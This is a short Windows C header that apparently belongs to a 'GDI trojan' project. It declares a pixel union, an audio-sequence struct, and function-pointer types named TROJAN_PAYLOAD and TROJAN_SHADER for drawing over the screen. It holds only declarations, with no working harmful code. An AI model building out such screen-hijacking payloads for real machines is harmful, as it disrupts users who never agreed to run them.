#pragma once
#include <Windows.h>
#define PAYLOAD_TIME 10
#define AUDIO_NUM 10
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *PRGBQUAD;
typedef void(TROJAN_PAYLOAD)(int t, HDC hdcScreen);
typedef void(TROJAN_SHADER)(int t, int w, int h, PRGBQUAD prgbScreen);
typedef void(AUDIO_SEQUENCE)(int nSamplesPerSec, int nSampleCount, PSHORT psSamples), * PAUDIO_SEQUENCE;
typedef struct tagAUDIO_SEQUENCE_PARAMS {
	int nSamplesPerSec;
	int nSampleCount;
	PAUDIO_SEQUENCE pAudioSequence;
} AUDIO_SEQUENCE_PARAMS, * PAUDIO_SEQUENCE_PARAMS;